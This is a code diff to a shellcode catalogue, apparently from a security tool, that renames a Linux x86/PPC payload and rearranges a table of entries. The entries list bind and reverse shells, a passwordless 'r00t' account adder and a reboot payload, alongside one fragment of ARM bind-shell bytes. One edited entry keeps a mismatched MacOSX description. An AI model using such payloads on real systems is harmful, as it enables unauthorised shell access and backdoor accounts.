@@ -420,7 +420,7 @@ char arm_linux_bind[] =
 	"\x0b\xff\x90\xef"   /*  swi	 0x900ff0b    (execve) */
 	"/bin/sh";
 
-char dual_linux[] =
+char x86_ppc_linux_binsh[] =
 //
 // These four bytes work out to the following instruction
 // in ppc arch: "rlwnm   r16,r28,r29,13,4", which will
@@ -509,7 +509,8 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"arm.linux.suidsh",      arm_linux_suidsh,         "Setuid and runs /bin/sh" )
  ENTRY(0,0,0,"arm.linux.bind",        arm_linux_bind,           "Binds /bin/sh to a tcp port" )
  ENTRY(0,0,30,"armle.osx.reverse",    armle_osx_reverse,        "iPhone reverse connect shell to HOST and PORT" )
- ENTRY(0,0,0,"dual.osx.binsh",        x86_ppc_binsh,            "x86/ppc MacOSX /bin/sh shellcode" )
+ ENTRY(0,0,0,"dual.linux.binsh",      x86_ppc_linux_binsh,      "x86/ppc MacOSX /bin/sh shellcode" )
+ ENTRY(0,0,0,"dual.osx.binsh",        x86_ppc_osx_binsh,        "Runs /bin/sh (works also on x86) (dual)" )
  ENTRY(0,0,0,"mips.linux.binsh",      mips_linux_binsh,         "Runs /bin/sh (tested on loongson2f)." )
  ENTRY(0,0,0,"ppc.osx.adduser",       ppc_osx_adduser,          "Adds a root user named 'r00t' with no pass." )
  ENTRY(0,0,0,"ppc.osx.binsh",         ppc_osx_binsh,            "Executes /bin/sh" )
@@ -517,7 +518,6 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"ppc.osx.bind4444",      ppc_osx_bind4444,         "Binds a shell at port 4444" )
  ENTRY(0,0,0,"ppc.osx.reboot",        ppc_osx_reboot,           "Reboots the box" )
  ENTRY(0,0,0,"ppc.bsd.binsh",         ppc_bsd_binsh,            "Runs /bin/sh" )
- ENTRY(0,0,0,"ppc.linux.binsh",       dual_linux,               "Runs /bin/sh (works also on x86) (dual)" )
  ENTRY(0,0,0,"sparc.linux.bind4444",  sparc_linux_bind4444,     "Binds a shell at TCP port 4444" )
  ENTRY(0,0,0,"x64.linux.binsh",       x64_linux_binsh,          "Runs /bin/sh on 64 bits" )
  ENTRY(0,0,0,"x86.bsd.binsh",         x86_bsd_binsh,            "Executes /bin/sh" )
